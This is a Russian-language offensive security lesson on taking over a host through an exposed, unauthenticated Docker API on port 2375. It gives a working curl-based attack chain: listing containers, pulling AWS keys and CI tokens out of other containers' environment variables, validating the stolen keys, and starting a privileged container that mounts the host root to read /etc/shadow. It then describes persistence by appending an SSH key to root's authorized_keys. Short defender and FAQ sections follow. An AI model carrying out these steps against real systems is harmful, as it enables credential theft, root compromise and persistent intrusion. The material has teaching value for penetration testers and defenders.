## Задача

Ты просканировал подсеть и увидел на одном из хостов открытый порт `2375`. Это порт **Docker-демона** — программы, которая управляет всеми контейнерами на машине. Если демон слушает сеть без пароля, то любой, кто до него дотянется, может запускать контейнеры **от имени root** и монтировать в них любые файлы хоста.

Цель урока: из одного открытого порта получить **чтение файлов хоста и root**. И по пути — собрать облачные креды, которые лежат в чужих контейнерах.

## Данные, с которыми работаем

Наш объект — хост **`10.10.20.7`** с открытым `2375`. Никаких кредов у нас пока нет.

Сначала убеждаемся, что это действительно Docker, а не что-то другое. Демон отвечает JSON'ом на обычный HTTP-запрос:

```bash
$ curl -s http://10.10.20.7:2375/version | jq -r '.Version, .Os, .Arch, .KernelVersion'
24.0.7
linux
amd64
5.15.0-91-generic
```

Версия и ядро правдоподобные — это живой демон, а не заглушка. **Проверять подлинность важно**: honeypot часто отвечает шаблонно и не даёт создать контейнер. Если `Version` пустая или `containers/create` не работает — не тратьте время.

Запоминаем разделитель: `jq` — разбор JSON, `-r` — вывод «сырой» строки без кавычек.

## Пробуем в лоб: что вообще открыто

Прежде чем что-то запускать, посмотрим, что уже есть на хосте. Docker API — это чистый REST, всё читается curl'ом.

```bash
$ BASE=http://10.10.20.7:2375
$ curl -s $BASE/containers/json | jq -r '.[] | .Names[0] + "  " + .Image'
/app_web   nginx:1.25
/ci-runner  gitlab/gitlab-runner:latest
/postgres   postgres:16
```

Три работающих контейнера. Особенно интересен `/ci-runner` — CI-раннеры почти всегда держат внутри токены и облачные креды. Демон отдаёт и список образов:

```bash
$ curl -s $BASE/images/json | jq -r '.[].RepoTags[]' | head
alpine:latest
nginx:1.25
postgres:16
```

`alpine:latest` уже скачан — маленький образ, идеален для нашего контейнера.

## Приём 1: читаем env чужих контейнеров

`docker inspect` (через API — `GET /containers/<id>/json`) возвращает конфиг контейнера, включая переменные окружения. **Переменные окружения (env)** — это пары `KEY=value`, которые передаются процессу; разработчики часто кладут туда креды «на время».

```bash
$ curl -s $BASE/containers/json | jq -r '.[].Id' | while read id; do
    curl -s $BASE/containers/$id/json | jq -r '.Config.Env[]?';
  done | grep -iE 'key|token|pass|secret|aws'
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=wJalr...
GITLAB_RUNNER_TOKEN=glrt-...
```

Вот и облачные креды, лежавшие «внутри» контейнера. Правда, `jq` печатает их обрезанно в примере — реально ты увидишь полные значения. Проверить, что они открывают:

```bash
$ AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=wJalr... aws sts get-caller-identity
{
    "UserId": "AIDA...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:role/ci-deploy"
}
```

Мы уже не «снаружи Docker» — мы внутри чужого AWS-аккаунта, роль `ci-deploy`. Но это может быть тупиковая роль. Пойдём дальше и получим полный root на самом хосте.

## Приём 2: привилегированный контейнер с монтированием корня

Идея: попросить демон запустить контейнер, в который мы **примонтируем корень хоста** (`/`) как папку `/host`. Тогда изнутри контейнера мы видим и можем менять любые файлы хоста. Это и есть побег.

Ключевые поля запроса:
- `Binds: ["/:/host"]` — смонтировать `/` хоста в `/host` контейнера;
- `Privileged: true` — дать контейнеру все ядерные привилегии.

В API эти поля нужно класть в `HostConfig`, иначе демон их проигнорирует:

```bash
$ curl -s -X POST "$BASE/containers/create?name=diag" \
  -H 'Content-Type: application/json' -d '{
    "Image":"alpine",
    "Cmd":["sleep","3600"],
    "HostConfig":{"Binds":["/:/host"],"Privileged":true}
  }' | jq -r '.Id'
e7b1c9...
```

Контейнер создан (`Id` вернулся). Запускаем и читаем файл хоста:

```bash
$ curl -s -X POST "$BASE/containers/diag/start"
$ curl -s -X POST "$BASE/containers/diag/exec" -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"Cmd":["head","-3","/host/etc/shadow"]}'
root:$6$rBq...:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
bin:*:19000:0:99999:7:::
```

Мы читаем `/etc/shadow` **самого хоста** — файл с хешами паролей всех пользователей. Это доступ уровня root: дальше можно читать `~/.ssh/authorized_keys`, дописывать свой ключ, править cron. Docker-демон работает от root, поэтому запущенный им контейнер действует от root.

## Полный прогон от начала до конца

1. Нашли `10.10.20.7:2375`, подтвердили `/version`.
2. Перечислили контейнеры → нашли CI-раннер.
3. Вытащили `AWS_*` из env → получили роль `ci-deploy` в чужом аккаунте.
4. Запустили `alpine` с `Binds ["/:/host"]` + `Privileged` → прочитали `/etc/shadow` хоста.
5. Для устойчивого доступа дописываем свой SSH-ключ в `/host/root/.ssh/authorized_keys` и заходим по SSH.

Всё это — четыре curl-запроса. Одна и та же логика работает и с локальным `docker.sock` (файл `/var/run/docker.sock` внутри контейнера): если он примонтирован, ты управляешь демоном хоста ровно так же, только через unix-сокет.

## Если не сработало

- **Порт 2376 (TLS).** Демон за TLS требует клиентский сертификат. Часто настройка слабая: сертификат лежит рядом, либо проверка отключена. Проверь `curl -sk https://host:2376/version`.
- **Демон только на unix-socket.** TCP закрыт — тогда нужен foothold внутри контейнера с примонтированным сокетом.
- **Создать контейнер нельзя.** Нет образа или прав. Используй уже существующий образ из `images/json`.
- **Не забывай `HostConfig`.** Поля `Binds`/`Privileged`, положенные в корень JSON, а не в `HostConfig`, демон молча отбросит — контейнер стартует без монтирования.

## Что мы теперь знаем

- Открытый `2375` = root на хосте: демон запускает контейнеры от root и монтирует любые пути.
- `Binds: ["/:/host"]` + `Privileged: true` в `HostConfig` дают чтение файлов хоста.
- Env чужих контейнеров — самый быстрый источник облачных кредов.
- unix-socket внутри контейнера эквивалентен открытому демону.
- Персистентность — через дописывание SSH-ключа в примонтированный `/root/.ssh`.

## Глазами защитника

Docker-демон не должен быть доступен по сети: порт 2375 не публикуют, 2376 — только с TLS и клиентскими сертификатами. Сокет `/var/run/docker.sock` монтируют в контейнер лишь как исключение. Права на сокет равны root на хосте, поэтому доступ к нему приравнивается к root. В кластерах монтирование сокета запрещают admission-политиками. Аудит: какие контейнеры имеют доступ к сокету, слушает ли демон на TCP и не выставлен ли он в интернет.

## Частые вопросы

**Почему доступ к `docker.sock` = root?**

Демон работает от root и выполняет всё, что ему передадут. Через API можно запустить привилегированный контейнер с монтированием `/` и выйти на хост — ограничений у демона нет.

**Чем опасен открытый порт 2375?**

Он даёт неаутентифицированный доступ к Docker API по сети. Если порт виден из интернета, любой может запускать контейнеры и захватывать хост.

**Что делать, если порт 2375 закрыт, но сокет смонтирован?**

Использовать сокет локально: `docker -H unix:///var/run/docker.sock`. Результат тот же — контроль над демоном и хостом.

**Как читать чужие контейнеры через API?**

`docker inspect` показывает переменные окружения и монтирования чужих контейнеров, где часто лежат токены и пароли. Это разведка перед побегом.

**Как защититься?**

Не публиковать демон в сеть, использовать TLS и авторизацию, не монтировать сокет в приложения, включать rootless-режим и admission-политики против монтирования сокета.

**Достаточно ли смонтировать только сокет, чтобы стать root?**

Да, если сокет доступен на запись. Запусти контейнер с `-v /:/host --privileged` и войди в хост через `chroot`. Отдельного эксплойта не нужно — это штатная функция демона.

**Опасен ли Docker API, доступный только на localhost?**

Да: если приложение с SSRF может обратиться к `127.0.0.1:2375`, оно получает контроль над демоном. Localhost — не защита от SSRF.

**Что делать, если демон требует TLS?**

Проверь, не лежат ли клиентские сертификаты рядом — в конфигах, в переменных. Иногда `DOCKER_TLS_VERIFY` и `DOCKER_CERT_PATH` указывают на доступные файлы.

**Чем rootless-докер меняет атаку?**

Демон работает от непривилегированного пользователя, поэтому побег даёт меньше прав. Но доступ к сокету всё ещё опасен: можно читать чужие контейнеры и их секреты.

**Что если сокет доступен только на чтение?**

Даже чтение через API (`docker inspect`, `docker ps`) раскрывает переменные окружения и монтирования чужих контейнеров, где лежат токены. Для побега нужна запись, но для разведки хватает и чтения.

**Как отличить «свой» сокет от хостового?**

Смотри, куда смонтирован сокет: если это `/var/run/docker.sock` хоста (а не собственного демона контейнера), ты работаешь с хостом. Проверь через `docker info` — версия и число контейнеров подскажут масштаб.

## Куда дальше
